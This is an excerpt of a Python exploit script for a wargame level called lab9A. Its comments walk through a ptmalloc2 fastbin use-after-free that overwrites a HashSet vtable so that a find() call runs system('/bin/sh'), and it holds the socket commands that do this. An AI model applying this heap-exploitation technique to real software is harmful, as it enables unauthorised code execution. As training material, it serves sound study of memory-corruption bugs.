RCE Exploit for level lab9A

#   Exploitation: In order to exploit this level, a good understanding of how
# ptmalloc2 works is essential. I will be explaining each step I took to pwn
# this challenge, but basically it leverages a use after free bug to lookup
# a function in a custom vtable which will end calling system() instead.

        print '\n[+] Stage 3: Craft custom vtable'
        # Here is the tricky part, we need to craft a custom vtable in order to
        # call system(). Here is the way I came up with in order to acomplish
        # this:

        # The reason behind the 4 items we select to allocate space for at the
        # begining is simple. 4 items means 16 bytes, plus 8 of overhead = 24
        # which is the same size as the HashSet. This means that when both get
        # free'd, they will be assigned to the same fast bin in fastbinY.
        # This is very convenient, because the itemlist will be free'd first,
        # and then, the HashSet object. The result will be that the fd pointer
        # of the HashSet free'd chunk, will point to the itemlist's free'd
        # chunk, and the most interesting thing: fd will overwrite the vtable!

        # Now we have a way of redirecting the vtable look-up. We only need to
        # craft a proper itemlist in order to serve as the new vtable. The item
        # list should look something like this:

        # +------------------+ <-- fd points here (this will be the new vtable)
        # |     prev_size    | <-- new HashSet<int, hash_num>::~HashSet()
        # +------------------+
        # |chunk_size + flags| <-- new HashSet<int, hash_num>::~HashSet()
        # +------------------+
        # |        fd        | <-- new HashSet<int, hash_num>::add()
        # +------------------+
        # |        bk        | <-- new HashSet<int, hash_num>::find()
        # +------------------+
        # |      unused      | <-- new HashSet<int, hash_num>::get()
        # +------------------+

        # Fortunately there is one position of the new vtable that won't be
        # overwritten by free() thus we can controll it. This is the index 2.
        # The way the program computes the index to which store the data, is
        # the following: index = val % size

        # We want to insert system() address which will look something like
        # this: 0xb7XXX190. And XXXXX190 % 4 will give us an index 0. This
        # position will be overwritten with fd so it doesn't qualify as a good
        # address :( Fortunately, an address that looks like this XXXXX191 is
        # valid since XXXXX191 % 4 = 2. This means we will skip one byte of
        # system()'s code, which is just a push ebx instruction so it won't
        # matter.

        sendrecv(s, '2\n0\n%d\n' % (system+1))  # Prepare the new vtable
        sendrecv(s, '4\n0\n')  # Force free() to overwrite old vtable
        print '[+] Custom vtable ready!'
        # Now we just have to reuse the wild pointer stored in the HashSet
        # array and force a call to find() which will be system() on our
        # new vtable
        sendrecv(s, '3\n0\n')
        sendrecv(s, '%d\n' % binsh, False)  # Pass /bin/sh to system()
        print '[+] Forced call to system() lab9A should be pwned :)'
